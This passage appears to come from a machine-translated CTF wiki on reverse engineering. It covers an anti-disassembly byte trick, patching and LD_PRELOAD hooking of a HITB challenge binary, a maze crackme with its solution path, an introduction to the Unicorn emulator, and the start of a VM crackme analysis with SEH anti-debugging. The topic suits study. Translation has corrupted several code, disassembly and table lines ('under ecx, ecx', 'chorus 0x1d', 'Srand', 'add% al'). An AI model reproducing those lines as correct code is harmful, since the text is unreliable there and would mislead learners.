<code>earth</code> function returns to jump to <code>Code</code> and continues to run, instead of <code>Return</code>.</p> <p>Look at a simple demo</p> <pre><code>; ----------------------------------------------------------------------------\n\n    call earth+1\n\nearth:  \n\n    DB 0xE9             ; 1 &lt;--- pushed return address,\n\n                        ; E9 is opcode for jmp to disalign disas-\n\n    ; sembly\n\n    pop eax             ; 1 hidden\n\nNOP ; first\n    add eax, 9          ; 2 hidden\n\n    push eax            ; 1 hidden\n\nright ; 1 hidden\n    DB 0xE9             ; 1 opcode for jmp to misalign disassembly\n\nCode:                   ; code continues here &lt;--- pushed return address + 9\n\nNOP\nNOP\nNOP\nright\n; ----------------------------------------------------------------------------\n</code></pre> <p>If you use objdump for disassembly, there will be problems with <code>call earth+1</code>, as follows:</p> <pre><code>00000000 &lt;earth-0x5&gt;:\n\n  0:    e8 01 00 00 00  call 6 &lt;earth+0x1&gt;\n\n00000005 &lt;earth&gt;:\n\n5: e9 58 90 05 09 jmp 9059062 &lt;earth+0x905905d&gt;\na: 00 00 add% al, (% eax)\n  c:    00 50 c3        add %dl,0xffffffc3(%eax)\n\n  f:    e9 90 90 90 c3  jmp c39090a4 &lt;earth+0xc390909f&gt;\n</code></pre> <p>Let's take a look at the case of <code>ida</code></p> <pre><code>text:08000000   ; Segment permissions: Read/Execute\n\n.text:08000000   _text  segment para public 'CODE' use32\n\n.text:08000000      assume cs:_text\n\n.text:08000000      ;org 8000000h\n.text:08000000      assume  es:nothing, ss:nothing, ds:_text,\n\n.text:08000000          fs:nothing, gs:nothing\n\n.text:08000000      dd 1E8h\n\n.text:08000004 ; -------------------------------------------------------------\n\n.text:08000004      add cl, ch\n\n.text:08000006      pop eax\n\n.text: 08000007 nop\n.text:08000008      add eax, 9\n\n.text:0800000D      push eax\n\n.text: 0800000E retn\n.text:0800000E ; -------------------------------------------------------------\n\n.text:0800000F      dd 909090E9h\n\n.text:08000013 ; -------------------------------------------------------------\n\n.text: 08000013 retn\n.text:08000013 _text        ends\n\n.text:08000013\n\n.text:08000013\n\n.text:08000013      end\n</code></pre> <p>We are very well hidden in the last three <code>nop</code>. Not only that, but our process of calculating <code>EIP</code> is also perfectly hidden. In fact, the entire disassembled code is completely different from the actual code.</p> <p>How to solve this problem? There is actually no tool that can guarantee '100%' accurate disassembly. When the disassembler does code simulation, it may be able to do the correct assembly.</p> <p>In reality, this is not a particularly big problem. Because it is for the interactive disassembler. You can specify the starting position of the code. And when debugging, you can also see the address of the actual jump of the program.</p> <p>So at this point we need static analysis, but also need dynamic debugging.</p> <p>Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques</p>"},{"location":"reverse/linux/ld_preload/","title":"LD_PRELOAD","text":""},{"location":"reverse/linux/ld_preload/#principle","title":"Principle","text":"<p>Under normal circumstances, Linux dynamic loader <code>ld-linux</code> (see man page ld-linux (8)) will search and load the shared link library file required by the program, and <code>LD_PRELOAD</code> is an optional environment variable, including One or more paths to the shared link library file. The loader will load the shared link library specified by <code>LD_PRELOAD</code> before the C language runtime, which is called preloading (<code>preload</code>).</p> <p>Preloading means that its functions will be called before the function of the same name in other library files, so that the library functions can be blocked or replaced. The path of multiple shared link library files can be <code>colon</code> or <code>space.</code>To distinguish. Obviously not affected by <code>LD_PRELOAD</code>, only those statically linked programs.</p> <p>Of course, to avoid malicious attacks, the loader will not be preloaded with <code>LD_PRELOAD</code> in the case of <code>ruid != euid</code>.</p> <p>Read more: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4</p>"},{"location":"reverse/linux/ld_preload/#example","title":"Example","text":"<p>Let's take the 2014 <code>Hack In The Box Amsterdam: Bin 100</code> as an example. Download the topic: hitb_bin100.elf</p> <p>This is a 64-bit ELF file. The results are shown below:</p> <p></p> <p>The program seems to be printing some sentences all the time. And there are no signs of stopping. Let's open it with IDA. First press <code>Shift+F12</code> to find the string.</p> <p></p> <p>Obviously, apart from the sentences that have been printed, we found some interesting strings:</p> <pre><code>.rodata:0000000000400A53 00000006 C KEY:\n\n.rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE'S YOUR FLAG:\n</code></pre> <p>We came to the key code according to the cross-reference of <code>OK YOU WIN. HERE&amp;#39;S YOUR FLAG:</code> (I deleted some unnecessary code).</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n\n{\n\n  qmemcpy(v23, &amp;unk_400A7E, sizeof(v23));\n\nv3 = v22;\n  for ( i = 9LL; i; --i )\n\n  {\n\n* (_DWORD *) v3 = 0;\nv3 + = 4;\n  }\n\n  v20 = 0x31337;\n\n  v21 = time(0LL);\n\n  do\n\n  {\n\n    v11 = 0LL;\n\n    do\n\n    {\n\n      v5 = 0LL;\n\n      v6 = time(0LL);\n\nSrand(233811181 - v21 + v6); // Initialize the random number seed\n      v7 = v22[v11];\n\nV22[v11] = rand() ^ v7; // pseudo-random number\n      v8 = (&amp;funny)[8 * v11];\n\n      while ( v5 &lt; strlen(v8) )\n\n      {\n\nv9 = v8 [v5];\n        if ( (_BYTE)v9 == 105 )\n\n        {\n\n          v24[(signed int)v5] = 105;\n\n        }\n\n        else\n\n        {\n\n          if ( (_DWORD)v5 &amp;&amp; v8[v5 - 1] != 32 )\n\nV10 = __ctype_toupper_loc(); // uppercase\n          else\n\nV10 = __ctype_tolower_loc(); // lowercase\n          v24[(signed int)v5] = (*v10)[v9];\n\n        }\n\n++ v5;\n      }\n\n      v24[(signed int)v5] = 0;\n\n      ++v11;\n\n__printf_chk(1LL, &amp;quot;Uranium %80s uranium \u7395n&amp;quot;, v24); // garbled is actually a note\n      sleep(1u);\n\n    }\n\n    while ( v11 != 36 );\n\n--v20;\n  }\n\n  while ( v20 );\n\nV13 = v22; // key is stored in the v22 array\n  __printf_chk(1LL, \"KEY: \", v12);\n\n  do\n\n  {\n\n    v14 = (unsigned __int8)*v13++;\n\n__printf_chk(1LL, &amp;quot;%02x &amp;quot;, v14); // output key\n  }\n\n  while ( v13 != v23 );\n\n  v15 = 0LL;\n\n  putchar(10);\n\n  __printf_chk(1LL, \"OK YOU WIN. HERE'S YOUR FLAG: \", v16);\n\n  do\n\n  {\n\nV17 = v23[v15] ^ v22[v15]; // XOR with the value of key\n++ v15;\nPutchar(v17); // output flag\n  }\n\n  while ( v15 != 36 );\n\nPutchar(10); // output line break\n  result = 0;\n\n  return result;\n\n}\n</code></pre> <p>The whole code flow is mainly to continuously output the sentences in <code>funny</code>, output the <code>key</code> after satisfying the loop condition, and XOR the <code>flag</code> to get the value of <code>flag</code>.</p> <p>But we can see that the number of times the whole loop is relatively small. So we can use some methods to make the loop faster. For example, I manually patch it, not let the program output the string (actually <code>printf</code>The time consumption is quite a lot.) The second is to use <code>LD_PRELOAD</code> to make the program's <code>sleep()</code> invalid. It can obviously save time.</p> <p>The process of manual patching is relatively simple. We can find the code location and then modify it with some hex editors. Of course, we can also use <code>IDA</code> to do patch work.</p> <p><code>`</code>asm .text:00000000004007B7                 call    ___printf_chk</p> <p>.text:00000000004007BC                 xor     eax, eax</p> <pre><code>Point the cursor on `call ___printf_chk`, then select the menu `Edit-&amp;gt;Patch Program-&amp;gt;Assemble` (of course you can use other patch methods. The effect is the same). Then modify it to `nop(0x90)`, as follows Figure\n\n\n![ida_patch.png](./figure/2014_hitb/ida_patch.png)\n\n\n\nModify the assembly code between `4007B7` and `4007BD` to `nop`. Then select the menu `Edit-&amp;gt;Patch Program-&amp;gt;Apply patches to input file`. Of course, it is best to make a backup (ie check) `Create a backup`), then click OK (I renamed to `patched.elf`, download link: [patched.elf](https://github.com/ctf-wiki/ctf-challenges/blob/ Master/reverse/linux-re/2014_hitb/patched.elf)).\n\n\n![ida_apply.png](./figure/2014_hitb/ida_apply.png)\n\n\n\nNow go to the `LD_PRELOAD` section. Here we simply write the c code, download link: [time.c](https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/linux-re/ 2014_hitb/time.c)\n\n\n``` c\n\nstatic int t = 0x31337;\n\n\nvoid sleep(int sec) {\n\n    t += sec;\n\n}\n\n\n\nint time() {\n\n    return t;\n\n}\n</code></pre> <p>Then use the command <code>gcc --shared time.c -o time.so</code> to generate the dynamic link file. Of course, the download link is also given: time.so</p> <p>Then open the linux terminal and run the command: <code>LD_PRELOAD=./time.so ./patched.elf</code></p> <p></p> <p>After a while, you can hear the sound of the CPU running wildly, and then the flag will come out soon.</p>"},{"location":"reverse/maze/maze/","title":"Maze problem","text":"<p>The maze problem has the following characteristics:</p> <ul> <li>Place a \"map\" in memory</li> <li>Limit user input to a few characters.</li> <li>Generally only one labyrinth entrance and one labyrinth exit</li> </ul> <p>The laid map can be composed of displayable characters (such as <code>#</code> and <code>*</code>) (this is very obvious, the basic view of the string knows that this is a labyrinth.), you can also use the invisible sixteen The value can be expressed. The map can be directly composed into a very long string, or arranged one by one. If it is arranged line by line, because the maze is generally larger, it is used to press the line (note, the arrangement is not pressed) Arrange in order, each line corresponds to a specific line number, you need to determine the line number to restore the maze map. The function of arranging the maze will be repeated many times.</p> <p>The restricted characters are usually a combination of easy memory (not a good idea), such as <code>w/s/a/d</code>, <code>h/j/k/l</code>, <code>l/r/u/d</code> Such a similar combination. Of course, the specific operation of each key needs to be analyzed and judged (like the one that uses only one string to represent the maze, you can use the <code>t</code> key to move the <code>12</code> characters to the right). The map, the general author will set an <code>X coordinate</code> and a <code>Y coordinate</code> to save the current position. We can also start analysis based on this feature.</p> <p>In general, the labyrinth has only one entrance and one exit, like the entrance at the top left corner <code>(0, 0)</code> position, and the exit at the bottom right corner <code>(max_X, max_Y)</code>. But there may be an exit. In the center of the maze, use a <code>Y</code> character to indicate, etc. The conditions for answering the maze question are also judged according to the specific situation.</p> <p>Of course, there may be more than one move of the maze, and there are cases where there are multiple moves, but asking for a move is the least costly. Then this can be disguised as an algorithmic problem.</p>"},{"location":"reverse/maze/maze/#volga-quals-ctf-2014-reverse-100","title":"Volga Quals CTF 2014: Reverse 100","text":"<p>Next, let's take this example as an example. This is a simple labyrinth. This question lays out the maps in order, using the characters <code>#</code> and <code>*</code>.</p> <p>The corresponding <code>crackme</code> can be downloaded here: rev100</p> <p>The corresponding <code>idb</code> can be downloaded here: rev100.i64</p> <p></p> <p>We can use the cursor to select all the map strings in the <code>.rodata</code> section, and press <code>shift+E</code> to extract all the map data.</p> <p></p> <p>However, the currently extracted map strings are not in order from top to bottom, so we need to go back to the pseudo-C code generated by IDA, get the line numbers and reorder them.</p> <p>The final complete map is as follows:</p> <p>The corresponding <code>Maze Map File</code> can be downloaded here: [maze_array.txt] (https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/maze/2014_volga_quals/maze_array.txt)</p> <p></p> <p>Look at the characters needed to move the maze:</p> <p></p> <p>Here we know that the characters that can be used are <code>L/R/U/D</code>, which correspond to <code>left/right/up/down</code> respectively.</p> <p>Look down</p> <p></p> <p>Through debugging, you can know that here is the time to print your input once after the user inputs <code>L/R/U/D</code>, and then print the corresponding <code>X/Y coordinates</code>. The final decision is successful. , that is, when <code>pos_x == 89 &amp;amp;&amp;amp; pos_y == 28</code>. Then we can get the path out of the maze based on the above information.</p> <p>[maze.jpg] (./ figure / maze.jpg)</p> <p>The last labyrinth path is</p> <pre><code>RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR\n</code></pre>"},{"location":"reverse/maze/maze/#reference-link","title":"Reference link","text":"<ul> <li>[[VolgaCTF Quals 2014 writeup - Reverse-100] (https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html)]</li> </ul>"},{"location":"reverse/unicorn/introduction/","title":"Unicorn Engine Introduction","text":""},{"location":"reverse/unicorn/introduction/#what-is-the-unicorn-engine","title":"What is the Unicorn Engine?","text":"<p>Unicorn is a lightweight, multi-platform, multi-architecture CPU simulator framework. We can better focus on CPU operation and ignore machine differences. Imagine we can apply it to these scenarios: for example, we simply need Simulate code execution instead of requiring a real CPU to do those operations, or want to analyze malicious code more securely, detect virus signatures, or want to verify the meaning of certain code in the reverse process. Using the CPU simulator can Good to help us provide convenience.</p> <p>Its highlights (which are also attributed to Unicorn's development based on [qemu] (http://www.qemu.org)) are:</p> <ul> <li>Support multiple architectures: Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64).</li> <li>Native support for Windows and nix systems (confirmed to include Mac OSX, Linux, BSD &amp; Solaris)</li> <li>API with platform independence and simplicity and ease of use</li> <li>Excellent performance with JIT compilation technology</li> </ul> <p>You can learn more about the technical details of the Unicorn engine at [Black Hat USA 2015] (http://www.unicorn-engine.org/BHUSA2015-unicorn.pdf). Github Project Homepage: unicorn</p> <p>Although it is unusual, it can't simulate the entire program or system, nor does it support system calls. You need to manually map memory and write data in, then you can start the simulation from the specified address.</p>"},{"location":"reverse/unicorn/introduction/#application-scenario","title":"Application scenario","text":"<p>When can I use the Unicorn engine?</p> <ul> <li>You can call some interesting functions in malware without creating a harmful process.</li> <li>for CTF competition</li> <li>for fuzz testing</li> <li>Plugin for gdb plugin, based on code emulation</li> <li>Simulate execution of some obfuscated code</li> </ul>"},{"location":"reverse/unicorn/introduction/#how-to-install","title":"how to install","text":"<p>The easiest way to install Unicorn is to use pip installation. Just run the following command from the command line (this is the installation method for users who like to use python. For those who want to use C, you need to go to the official website to view the document. Compile the source package):</p> <pre><code>pip install unicorn\n</code></pre> <p>But if you want to compile locally with source code, you need to download the source package from the [Download] (http://www.unicorn-engine.org/download/) page, and then follow these commands:</p> <ul> <li>*nix platform users</li> </ul> <pre><code>$ cd bindings/python\n\n$ sudo make install\n</code></pre> <ul> <li>Windows platform users</li> </ul> <pre><code>cd bindings/python\n\npython setup.py install\n</code></pre> <p>For Windows, after executing the above command, you need to copy all the dll files of the <code>Windows core engine</code> on the [Download] (http://www.unicorn-engine.org/download/) page to <code>C:\\locationtopython \\Lib\\site-packages\\unicorn</code> location.</p>"},{"location":"reverse/unicorn/introduction/#quick-guide-to-using-unicorn","title":"Quick guide to using unicorn","text":"<p>We'll show you how to use python to call unicorn's api and how easy it is to emulate binary code. Of course, the api used here is only a small part, but it's enough for getting started.</p> <pre><code> 1 from __future__ import print_function\n\n 2 from unicorn import *\n\n 3 from unicorn.x86_const import *\n\n 4 \n\n 5 # code to be emulated\n\n 6 X86_CODE32 = b\"\\x41\\x4a\" # INC ecx; DEC edx\n\n 7 \n\n 8 # memory address where emulation starts\n\n 9 ADDRESS = 0x1000000\n\n10 \n\n11 print(\"Emulate i386 code\")\n\n12 try:\n\n13     # Initialize emulator in X86-32bit mode\n\n14 mu = Uc (UC_ARCH_X86, UC_MODE_32)\n15 \n\n16     # map 2MB memory for this emulation\n\n17 mu.mem_map (ADDRESS, 2 * 1024 * 1024)\n18 \n\n19     # write machine code to be emulated to memory\n\n20     mu.mem_write(ADDRESS, X86_CODE32)\n\n21 \n\n22     # initialize machine registers\n\n23     mu.reg_write(UC_X86_REG_ECX, 0x1234)\n\n24     mu.reg_write(UC_X86_REG_EDX, 0x7890)\n\n25 \n\n26     # emulate code in infinite time &amp; unlimited instructions\n\n27     mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32))\n\n28 \n\n29     # now print out some registers\n\n30     print(\"Emulation done. Below is the CPU context\")\n\n31 \n\n32     r_ecx = mu.reg_read(UC_X86_REG_ECX)\n\n33     r_edx = mu.reg_read(UC_X86_REG_EDX)\n\n34 print (&amp;quot;&amp;gt;&amp;gt;&amp;gt; ECX = 0x% x&amp;quot;% r_ecx)\n35     print(\"&gt;&gt;&gt; EDX = 0x%x\" %r_edx)\n\n36 \n\n37 except UcError as e:\n\n38     print(\"ERROR: %s\" % e)\n</code></pre> <p>The results are as follows:</p> <pre><code>$ python test1.py \n\nEmulate i386 code\n\nEmulation done. Below is the CPU context\n\n&amp;gt;&amp;gt;&amp;gt; ECX = 0x1235\n&gt;&gt;&gt; EDX = 0x788f\n</code></pre> <p>The comments in the sample are very intuitive, but we still explain each line of code:</p> <ul> <li> <p>Line number 2~3: Import the <code>unicorn</code> module before using Unicorn. Some x86 register constants are used in the example, so you need to import the <code>unicorn.x86_const</code> module.</p> </li> <li> <p>Line number 6: This is the binary machine code we need to simulate. Using hexadecimal representation, the assembly instructions are: \"INC ecx\" and \"DEC edx\".</p> </li> <li> <p>Line number 9: We will simulate the virtual address where the above instructions are executed.</p> </li> <li> <p>Line number 14: Initialize Unicorn with the <code>Uc</code> class, which accepts 2 parameters: hardware architecture and hardware bits (mode). In the example we need to simulate 32-bit code that executes the x86 architecture, I We use the variable <code>mu</code> to accept the return value.</p> </li> <li> <p>Line number 17: Use the <code>mem_map</code> method to map 2MB for the memory space that is executed according to the address declared at line number 9. All CPU operations in the process should only access this memory area. The mapped memory has a default Read, write and execute permissions.</p> </li> <li> <p>Line number 20: Write the code that needs to be simulated to the memory we just mapped. The <code>mem_write</code> method accepts 2 parameters: the memory address to be written and the code to be written to memory.</p> </li> <li> <p>Line number 23~24: Set the values of the <code>ECX</code> and <code>EDX</code> registers using the <code>reg_write</code> method.</p> </li> <li> <p>Line number 27: Start the simulation execution using the <code>emu_start</code> method. The API accepts 4 parameters: To simulate the code address of execution, simulate the memory address where execution is stopped (here The last byte of <code>X86_CODE32</code>, simulates the execution time and the number of instructions that need to be executed. If we ignore the last two parameters as in the example, Unicorn will default to simulate execution with infinite time and infinite number of instructions. Code.</p> </li> <li> <p>Line number 32~35: Print out the values of the <code>ECX</code> and <code>EDX</code> registers. We use the function <code>reg_read</code> to read the value of the register.</p> </li> </ul> <p>To see more python examples, look at the code in the folder [bindings/python] (https://github.com/unicorn-engine/unicorn/tree/master/bindings/python). The C example is You can view the code under the sample folder.</p>"},{"location":"reverse/unicorn/introduction/#reference-link","title":"Reference link","text":"<ul> <li> <p>Unicorn Official Site</p> </li> <li> <p>Quick tutorial on programming with Unicorn - with C &amp; Python.</p> </li> </ul>"},{"location":"reverse/vm/vm/","title":"Virtual machine analysis","text":"<p>For the virtual machine analysis part, we will explain it with a simple crackme.</p> <p>The corresponding <code>crackme</code> can be downloaded here: [FuelVM.exe] (https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/vm/fuelvm/FuelVM.exe)</p> <p>The corresponding <code>keygenme</code> can be downloaded here: fuelvm_keygen.py</p> <p>The corresponding <code>IDA database</code> can be downloaded here: FuelVM.idb</p> <p>The author of this question designed a simple virtual machine with multiple instructions. We used IDA for analysis. For the sake of convenience, I renamed some of the disassembled variables.</p>"},{"location":"reverse/vm/vm/#run-the-program","title":"Run the program","text":"<p>We run the program FuelVM.exe. The interface is as follows</p> <p></p> <p>In this interface, we see the right two input boxes, one for entering the username Name and the other for entering the key Key. There are two buttons, Go for submitting input, and Exit for exiting. program.</p>"},{"location":"reverse/vm/vm/#get-user-input","title":"Get user input","text":"<p>Then we can start from here. The program wants to get user input, an API that needs to be called is <code>GetDlgItemTextA()</code></p> <pre><code>UINT GetDlgItemTextA(\n\n  HWND  hDlg,\n\n  int   nIDDlgItem,\n\n  LPSTR lpString,\n\n  int   cchMax\n\n);\n</code></pre> <p>The obtained input string will be saved in <code>lpString</code>. Then we can open IDA to find the place with the cross reference <code>GetDlgItemTextA()</code>.</p> <p><code>`</code>asm .text:00401142                 push    0Ch             ; cchMax</p> <p>.text: 00401144 push offset inputName; lpString .text:00401149                 push    3F8h            ; nIDDlgItem</p> <p>.text:0040114E                 push    [ebp+hWnd]      ; hDlg</p> <p>.text:00401151                 call    GetDlgItemTextA</p> <p>.text:00401156                 push    0Ch             ; cchMax</p> <p>.text: 00401158 push offset inputKey; lpString .text:0040115D                 push    3F9h            ; nIDDlgItem</p> <p>.text:00401162                 push    [ebp+hWnd]      ; hDlg</p> <p>.text:00401165                 call    GetDlgItemTextA</p> <p>.text:0040116A                 mov     var_a, 0</p> <p>.text:00401171                 call    process_input</p> <p>.text:00401176                 jmp     short locExit</p> <pre><code>As above, IDA only calls `GetDlgItemTextA` here and calls it twice to get `inputName` and `inputKey` respectively. Then initializes a variable to 0, because it doesn&amp;#39;t understand the role of this variable, so rename it to `var_a` first. After a function call and jmp jump. Because the code of the jmp jump position is some code to exit the program, so we can conclude that the above call is a function that calls the user input. So the position of jmp is heavy. Named `locExit`, the function is renamed to `process_input`.\n\n\n## Handling user input\n\n\nWe enter the `process_input` function, which simply handles the input string very simply.\n\n\n```c\n\n  result = strlength((int)inputName);\n\n  if ( v1 &gt;= 7 )                                // v1 = length of inputName\n\n  {\n\n    *(_DWORD *)&amp;lenOfName = v1;\n\n    result = strlength((int)inputKey);\n\n    if ( v2 &gt;= 7 )                              // v2 = length of inputKey\n\n    {\n\n      i = 0;\n\n      do\n\n      {\n\n        inputName[i] ^= i;\n\n        ++i;\n\n      }\n\n      while ( i &lt;= *(_DWORD *)&amp;lenOfName );\n\n      unk_4031CE = i;\n\n      dword_4031C8 = dword_4035FF;\n\ninitVM ();\ninitVM ();\n__debugbreak ();\n      JUMPOUT(*(_DWORD *)&amp;word_4012CE);\n\n    }\n\n  }\n\n  return result;\n</code></pre> <p>The first is the <code>strlength()</code> function. The function uses <code>cld; repne scasb; not ecx; dec ecx</code> to calculate the string length and save the result in <code>ecx</code>. The assembly basics are not introduced. So we Rename the function to <code>strlength</code></p> <p><code>`</code>asm .text:004011C2 arg_0           = dword ptr  8</p> <p>.text:004011C2</p> <p>.text:004011C2                 push    ebp</p> <p>.text:004011C3                 mov     ebp, esp</p> <p>.text:004011C5                 mov     edi, [ebp+arg_0]</p> <p>.text: 004011C8 under ecx, ecx .text:004011CA                 sub     al, al</p> <p>.text:004011CC                 not     ecx</p> <p>.text:004011CE                 cld</p> <p>.text:004011CF                 repne scasb</p> <p>.text:004011D1                 not     ecx</p> <p>.text:004011D3                 dec     ecx</p> <p>.text:004011D4                 leave</p> <p>.text: 004011D5 retn 4 .text:004011D5 strlength       endp</p> <pre><code>In the pseudo-C code generated by IDA, there are `v1` and `v2`, I have annotated it, you can see the assembly, which is compared with `cx` and `7`, and `ecx` is a string. Length, so we can know that the input requirements here are: *inputName and inputKey are not less than 7*\n\n\nWhen the lengths of `inputName` and `inputKey` are not less than 7, then you can make a simple transformation on the input. Here is a loop\n\n\n```c\n\n      i = 0;\n\n      do\n\n      {\n\n        inputName[i] ^= i;\n\n        ++i;\n\n      }\n\n      while ( i &lt;= *(_DWORD *)&amp;lenOfName );\n</code></pre> <p>The corresponding python code is</p> <pre><code>def obfuscate(username):\n\n    s = \"\"\n\n    for i in range(len(username)):\n\n        s += chr(ord(username[i]) ^ i)\n\n    return s\n</code></pre> <p>After the function is assigned to some variables (these are not important, just ignore it.)</p>"},{"location":"reverse/vm/vm/#registering-seh","title":"Registering SEH","text":"<p><code>`</code>asm .text:004012B5                 push    offset seh_handler</p> <p>.text:004012BA                 push    large dword ptr fs:0</p> <p>.text:004012C1                 mov     large fs:0, esp</p> <p>.text:004012C8                 call    initVM</p> <p>.text:004012CD                 int     3               ; Trap to Debugger</p> <pre><code>`initVM` is done by some virtual machine initialization before starting (in fact, it is the initial value of some registers and related parts), we will discuss later. Here we are concerned about the SEH part. Here is registered a SEH handle, exception I renamed the handler to `seh_handler` and then manually triggered the exception using `int 3`. In the `seh_handler` location, IDA did not correctly identify the corresponding code.\n</code></pre> <p>.text:004012D7 seh_handler     db 64h                  ; DATA XREF: process_input+7D\u0018o</p> <p>.text:004012D8                 dd 58Fh, 0C4830000h, 13066804h, 0FF640040h, 35h, 25896400h</p> <p>.text:004012D8                 dd 0</p> <p>.text:004012F4                 dd 1B8h, 0F7C93300h, 0F7C033F1h, 0FFC483E1h, 8F64FDEBh</p> <p>.text:004012F4                 dd 5, 4C48300h, 40133068h, 35FF6400h, 0</p> <p>.text:0040131C                 dd 258964h, 33000000h, 33198BC9h, 83E1F7C0h, 0FDEBFFC4h</p> <p>.text:0040131C                 dd 58F64h, 83000000h, 5E6804C4h, 64004013h, 35FFh, 89640000h</p> <p>.text:0040131C                 dd 25h, 0C033CC00h, 0C483E1F7h, 83FDEBFFh, 4035FF05h, 0D8B0200h</p> <p>.text:0040131C                 dd 4035FFh, 3000B1FFh, 58F0040h, 4031C8h, 31C83D80h, 750A0040h</p> <p>.text:0040131C                 dd 0B1FF4176h, 403000h, 31C8058Fh, 3D800040h, 4031C8h</p> <pre><code>We can click the corresponding position and press the `c` key to convert the data into code for identification. (We need to press the c key multiple times to convert), and get the following code.\n\n\nAs follows, in the `seh_handler` position, a similar method is used to register an exception handler located at `401306h`, and a `x0 ecx, ecx; div ecx` is manually triggered by a `divide 0 exception`. and at `loc_401301 `Location, this is an anti-debugging trick, `jmp loc_401301+2` will cause `EIP` to turn to the middle of an instruction, making it impossible to continue debugging. So we can remove the `nop` of the `00401301~00401306` part, then `00401306`Location creates a new function `seh_handler2`\n</code></pre> <p>seh_handler:                            ; DATA XREF: process_input+7D\u0018o</p> <p>.text:004012D7                 pop     large dword ptr fs:0</p> <p>.text:004012DE                 add     esp, 4</p> <p>.text:004012E1                 push    401306h</p> <p>.text:004012E6                 push    large dword ptr fs:0</p> <p>.text:004012ED                 mov     large fs:0, esp</p> <p>.text:004012F4                 mov     eax, 1</p> <p>.text: 004012F9 xor ecx, ecx .text: 004012FB div ecx .text:004012FD                 xor     eax, eax</p> <p>.text: 004012FF mul ecx .text:00401301</p> <p>.text:00401301 loc_401301:                             ; CODE XREF: .text:00401304\u0019j</p> <p>.text:00401301                 add     esp, 0FFFFFFFFh</p> <p>.text:00401304                 jmp     short near ptr loc_401301+2</p> <p>.text:00401306 ; ---------------------------------------------------------------------------</p> <p>.text:00401306                 pop     large dword ptr fs:0</p> <p>.text:0040130D                 add     esp, 4</p> <p>.text:00401310                 push    401330h</p> <p>.text:00401315                 push    large dword ptr fs:0</p> <p>.text:0040131C                 mov     large fs:0, esp</p> <p>.text: 00401323 xor ecx, ecx .text: 00401325 mov ebx, [ecx] .text:00401327                 xor     eax, eax</p> <p>.text:00401329                 mul     ecx</p> <pre><code>Similarly, `401330h` is renamed to `seh_handler3`, and `40135Eh` is the last registered exception handler. We can speculate that this is the real main function of the virtual machine, so we renamed `40135Eh` to `vm_main`. (For the SEH and anti-debugging part, you can recommend yourself to go to the dynamic debugging to figure out)\n\n\n## Restore stack balance\n\n\nWe created a `vm_main` function (you need to create a function after renaming, IDA can recognize it), then press `F5` to prompt the failure. The reason for the failure is due to the stack imbalance. So we can click on the IDA menu item. `Options-&amp;gt;General` check the `stack pointer` on the right side. This will display the corresponding stack pointer.\n</code></pre> <p>.text:004017F2 000                 jmp     vm_main</p> <p>.text:004017F7     ; ---------------------------------------------------------------------------</p> <p>.text:004017F7 000                 push    0               ; uType</p> <p>.text:004017F9 004                 push    offset aError   ; \"Error\"</p> <p>.text:004017FE 008                 push    offset Text     ; \"The key is wrong.\"</p> <p>.text:00401803 00C                 push    0               ; hWnd</p> <p>.text:00401805 010                 call    MessageBoxA</p> <p>.text:0040180A</p> <p>.text:0040180A     locret_40180A:                          ; CODE XREF: vm_main+492\u0018j</p> <p>.text:0040180A 000                 leave</p> <p>.text:0040180B -04                 leave</p> <p>.text:0040180C -08                 leave</p> <p>.text:0040180D -0C                 leave</p> <p>.text:0040180E -10                 leave</p> <p>.text:0040180F -14                 leave</p> <p>.text:00401810 -18                 leave</p> <p>.text: 00401811 -1C retn .text:00401811     vm_main         endp ; sp-analysis failed</p> <pre><code>We come to the bottom to show the unbalanced position. The top `jmp vm_main` indicates that the virtual machine is executing a loop internally. The call to `MessageBoxA` is to display the last pop-up error message. At the location of `locret_40180A`, after much The leave stack is heavily unbalanced, so we need to manually restore the stack balance.\n\n\nIt&amp;#39;s also very simple. The `0040180A` position has been stack balanced (000), so we only need to change the `leave` to `retn`.\n</code></pre> <p>.text:0040180A     locret_40180A:                          ; CODE XREF: vm_main+492\u0018j</p> <p>.text: 0040180A 000 retn .text:0040180B     ; ---------------------------------------------------------------------------</p> <p>.text:0040180B 004                 leave</p> <p>.text:0040180C 004                 leave</p> <p>.text:0040180D 004                 leave</p> <pre><code>Then you can find that `vm_main` can generate pseudo C code in F5.\n\n\n## Virtual machine instruction analysis\n\n\nTo be honest, the analysis part of the virtual machine is a relatively tedious restore process. You need to compare the operations of each small part to determine what kind of instruction is this, which registers are used. Like this crackme, vm is a `Fetch-decode-execute` loop. The `decode` procedure gives us the most information. Different instructions are here, according to their respective `opcode`, using the `if-else if-else` branch. Differentiate. The actual restore process is not complicated, but it may be tedious because of the number of instructions implemented by the virtual machine.\n\n\nThe final analysis results are as follows:\n\n\n| opcode | value |\n\n| ------ | ----- |\n\n| push   | 0x0a  |\n\n| pop    | 0x0b  |\n\n| mov    | 0x0c  |\n\n| cmp    | 0x0d  |\n\n| inc    | 0x0e  |\n\n| dec    | 0x0f  |\n\n| and    | 0x1b  |\n\n| or     | 0x1c  |\n\n| chorus 0x1d |\n| check  | 0xff  